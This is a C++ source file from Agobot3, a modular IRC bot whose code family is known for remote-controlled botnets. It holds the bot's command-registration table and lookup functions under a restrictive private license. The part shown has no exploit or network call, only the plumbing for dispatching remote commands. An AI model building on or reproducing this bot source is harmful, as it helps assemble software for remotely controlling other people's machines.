/*	Agobot3 - a modular IRC bot for Win32 / Linux
	Copyright (c) 2004 Ago and the Agobot team
	All rights reserved.

	This is private software, you may redistribute it under the terms of
	the APL(Ago's Private License) which follows:
  
	Redistribution and use in binary forms, with or without modification,
	are permitted provided that the following conditions are met:
	1. The name of the author may not be used to endorse or promote products
	   derived from this software without specific prior written permission.
	2. The binary and source may not be sold and/or given away for free.
	3. The licensee may only create binaries for his own usage, not for any
	   third parties.
	4. The person using this sourcecode is a developer of said sourcecode.

	Redistribution and use in source forms, with or without modification,
	are not permitted.

	This license may be changed without prior notice.

	THIS SOFTWARE IS PROVIDED BY THE AUTHOR ``AS IS'' AND ANY EXPRESS OR
	IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES
	OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED.
	IN NO EVENT SHALL THE AUTHOR BE LIABLE FOR ANY DIRECT, INDIRECT,
	INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT
	NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE,
	DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY
	THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT
	(INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF
	THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE. */

#include "main.h"
#include "commands.h"
#include "mainctrl.h"

#define MAX_COMMANDS 256

CMutex g_mCommands;
CommandInfo *g_iCommands;
bool g_bCommandsInited=false;

void RegisterCommand(CommandInfo *pCommand) {
	int i; 
	if(!g_bCommandsInited) 
	{
		g_iCommands=new CommandInfo[MAX_COMMANDS];
		g_bCommandsInited=true; 
		for(i=0; i<MAX_COMMANDS; i++)
		{
			CommandInfo *pTemp=&g_iCommands[i]; 
			pTemp->pHandler=NULL; 
		}
	}

	for(i=0; i<MAX_COMMANDS; i++) {
		CommandInfo *pTemp=&g_iCommands[i];
		if(pTemp->pHandler==NULL) {
			pTemp->bFallBack=pCommand->bFallBack;
			pTemp->pHandler=pCommand->pHandler;
			strncpy(pTemp->szName, pCommand->szName, sizeof(pTemp->szName));
			break;
		}
	}
}

CCommands::CCommands() { }
CCommands::~CCommands() { delete [] g_iCommands; }

CommandInfo *CCommands::FindCommandByName(const char *szName, bool bExact) {
	if(!szName) return NULL; for(int i=0; i<MAX_COMMANDS; i++) {
		CommandInfo *pTemp=&g_iCommands[i];
		if(pTemp->pHandler==NULL || pTemp->szName==NULL) break;
		if(!strcmp(pTemp->szName, szName)) return pTemp; }
	return NULL; }

CommandInfo *CCommands::FindFallBack() {
	for(int i=0; i<MAX_COMMANDS; i++) {
		CommandInfo *pTemp=&g_iCommands[i];
		if(pTemp->pHandler==NULL || pTemp->szName==NULL) break;
		if(pTemp->bFallBack) return pTemp; }
	return NULL; }

bool CCommands::HandleCommand(CMessage *pMsg)
{	
	return false; 
}

REGOBJ(CCommands, g_pCommands, false, 0);


